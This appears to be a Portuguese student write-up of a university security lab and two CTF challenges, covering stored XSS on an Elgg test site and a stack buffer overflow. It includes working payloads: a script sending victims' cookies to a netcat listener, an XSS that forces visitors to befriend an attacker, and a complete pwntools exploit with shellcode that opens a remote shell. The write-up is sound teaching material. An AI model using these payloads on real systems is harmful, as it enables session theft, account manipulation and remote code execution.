# Trabalho realizado na Semana #10

## Tarefa 1
Efetuou-se o *log in* na plataforma http://www.seed-server.com sob o perfil de Alice forncido. Para efetuar o XSS, alterou-se a secção *Brief Description* para o código indicado. 

![/imgs10/brief.png](/imgs10/brief.png)

Imediamente após o guardar das alterações, como esperado, obteve-se o *pop-up*:

![/imgs10/popup.png](/imgs10/popup.png)

Experimentou-se também com o exemplo usando um *form* e apesar de apenas se usar um *link* exemplificativo, pode comprovar-se que efetivamente funcionaria: 

![/imgs10/withForm.png](/imgs10/withForm.png)

## Tarefa 2

Alterou-se novamente a secção *Brief Description* desta vez para:
```html
<script>alert(document.cookie);</script>
```

Como resultado, surgiu o *pop up* com as *cookies* do utilizador mal as alterações foram guardadas.

![/imgs10/cookies.png](/imgs10/cookies.png)

## Tarefa 3

Inicialmente, na *shell*, correu-se o seguinte comando por forma a iniciar o servidor TCP:
```sh
nc -lknv 5555
```

Seguidamente mudou-se *Brief Description* para efetuar o ataque:

```html
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');</script>
```

Após guardar as alterações no perfil, verificou-se a chegada das *cookies* do utilizador autenticado, neste caso, da Alice ao terminal onde se tinha iniciado o servidor.

![/imgs10/cookiesAlice.png](/imgs10/cookiesAlice.png)

Por forma a melhor testar a solução encontrada, efetuou-se a autenticação de Boby e acedeu-se ao perfil de Alice.

Sem surpresa, chegou ao terminal as cookies de Boby.

![/imgs10/cookiesBoby.png](/imgs10/cookiesBoby.png)


## Tarefa 4

Por forma a perceber como executar o ataque, foi necessário compreender como funciona o mecanismo de adicionar um amigo. Com a ferramenta *HTTP Header Live* detetaram-se pedidos deste género a cada novo amigo:

![/imgs10/amizadeAliceBob.png](/imgs10/amizadeAliceBob.png)

Com a repetição de pedidos percebeu-se que a variável *friend* era igual a um identificador para a pessoa que se queria adicionar como amiga. Por outro lado, a restante parte do *link* era constituída pela sequência *ts*, *token*, *ts* e *token* que são calculados no *script* fornecido. Como tal, bastava modificar o script para:

```html
<script type="text/javascript">
window.onload = function () {
    var Ajax=null;

    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
    
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```

e colocá-lo na secção *About me* do perfil do Samy. 

Como espectável, iniciando sessão como outro utilizador e visitanto o perfil de *Samy* este é adicionado como amigo,

![/imgs10/sammyFriend.png](/imgs10/sammyFriend.png)


### Questão 1

Em Elgg, as todas as ações requerem *tokens* CSRF (por questões de segurança) que, por vezes, têm de ser gerados manualmente. As linhas 1 e 2 são a geração destes *tokens*. Mais informações sobre estes *tokens* podem ser vistas no seguinte link: http://learn.elgg.org/en/stable/guides/actions.html#security

### Questão 2

Se apenas fosse usado *Editor Mode*, o texto inserido teria os seus carateres especiais como "<" e ">" codificados como se mostra abaixo:

![/imgs10/editorMode.png](/imgs10/editorMode.png)

Desta forma, o código não seria reconhecido como *script* e, logo, não seria possível corrê-lo.

## CTF - Desafio 1
O enunciado sugere que se procurem fragilidades no formulário de submissão. 

Tentou-se *SQLInjection* sem sucesso. Com mais sucesso, ao colocar: 
```html
<script>alert("hello");</script>
```

surgiu no ecrã :

![/imgs10/ctf/alert.png](/imgs10/ctf/alert.png)

Pode-se assim concluir que o *site* é vulnerável a *XSS*.

Surgiu assim a questão de que código injetar. Reparou-se num botão muito sugestivo *Give the flag*.

Desta forma tentou-se replicar o comportamento deste botão em *JavaScript*. 

Assim, injetou-se o seguinte código no formulário: 

```html
<script>
getFlag = function () {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "");
    xmlHttp.send("giveflag");
    return xmlHttp.responseText;
};
console.log(getFlag());
</script>
```

Inicialmente, nada surgiu, mas, mal o pedido foi avaliado, a *flag* surgiu no ecrã:

![/imgs10/ctf/flag1.png](/imgs10/ctf/flag1.png)


## CTF - Desafio 2

Começou-se por executar o seguinte comando:
```sh
checksec program
```
que retornou a seguinte informação:  
![/imgs10/ctf/checksec_program.png](/imgs10/ctf/checksec_program.png)

Daqui foi possível concluir o seguinte:  
- Sem cannary a proteger a *stack*
- A stack tem permissões de execução
- As posições do binário estão randomizadas
- Existem regiões de memória com permissões de leitura, escrita e execução simultaneamente


Analisando o *source code* constatou-se que existe uma vulnerabilidade em:

```c
gets(buffer);
```

uma vez que é feita uma leitura sem verificar o tamanho do *buffer*, que neste caso é 100.


Com esta vulnerabilidade e dado que a *stack* tem permissão de execução, é possível
efetuar um ataque por *buffer overflow* de forma a lançar uma *shell* no *server*.


Assim, essencialmente, será preciso fazer o seguinte:
1. Injetar no *buffer* do programa o *shellcode* que lança uma *shell*;
2. Alterar o *return address* da função de modo a "apontar" para o *shellcode* injetado.


Para ser possível efetuar o passo `2.` torna-se necessário saber qual o *offset*
entre o início do *buffer* e o *return address*.  
Recorrendo ao *gdb*:  

![/imgs10/ctf/gdb.png](/imgs10/ctf/gdb.png)

contatou-se que o *ebp* está 104 *bytes* acima de `buffer[0]`. Assim, e dado que o
*return address* se encontra imediatamente acima do *ebp* basta adicionar 4
(versão de 32 *bits*) ao 104:
```py
offset = 108
```

Assim, e alterando um *script* em *python* usado anteriormente, chegou-se ao seguinte *script* alterado:

```py
#!/usr/bin/python3
import sys
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
else:    
    p = remote("10.227.243.188", 4001)


p.recvuntil(b"Your buffer is ")
line = p.recvline()
num = int(line[2:10], 16)
p.recvuntil(b"input:")

##################################################################

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(112)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = num         # Change this number 
offset = 108	     # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 

##################################################################

print(bytes(content))
p.sendline(bytes(content))
p.interactive()
```

Resumidamente, este script efetua os seguintes passos:
1. Conecta-se a `ctf-fsi.fe.up.pt` na porta `4001`;
2. Lê o endereço do *buffer* (ele altera-se a cada execução como visto no *output* de `checksec`);
3. Preenche um array com *`NOP's`*;
4. Coloca o *shellcode* que lança uma *stack* no início desse array;
5. Coloca o endereço do início do *buffer* na posição com *offset* calculado anteriormente;
6. Envia o conteúdo do array para o *server*.

Após a execução do *script*, surgiu uma *shell* e foi possível obter a flag com:

```sh
cat flag.txt
```

![/imgs10/ctf/flag2.png](/imgs10/ctf/flag2.png)
